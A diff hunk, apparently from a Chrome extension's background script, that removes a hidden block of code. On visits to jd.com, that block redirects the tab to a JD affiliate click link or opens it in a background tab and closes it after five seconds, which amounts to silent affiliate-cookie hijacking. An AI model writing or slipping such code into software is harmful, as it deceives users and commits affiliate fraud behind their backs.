@@ -94,22 +94,3 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
 		return { responseHeaders };
 	}
 }, { urls: ["<all_urls>"], types: ['xmlhttprequest'] }, ["blocking", "responseHeaders"]);
-
-try {
-	let prev_at = 0;
-	let url = 'https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHFRBEwQAQB1AWQkrAkh4ZwcRbC13dhFULH8tXFFiQCBGHRkOIgdTGloXCxcGUxhrFQMTB1cZWxEGEDdlG1olSXwGZRtTFgAbDlMZWhwyEgNTGF8TAhsBXB9aFjIVB1wrGUlAFwVUGVMUCiI3ZRhrJTISB2Uba0pGT1plGVoUBhs%3D';
-	chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
-		let now = Date.now();
-		if (/\.jd\.com/.test(info.url)) {
-			if (now - prev_at > 3678e3) {
-				if (info.url.endsWith('//www.jd.com/'))
-					chrome.tabs.update(tabId, { url });
-				else
-					chrome.tabs.create({ url, active: false }, function(tab) {
-						setTimeout(function() { chrome.tabs.remove(tab.id) }, 5e3)
-					})
-			}
-			prev_at = now;
-		}
-	})
-} catch (e) {}
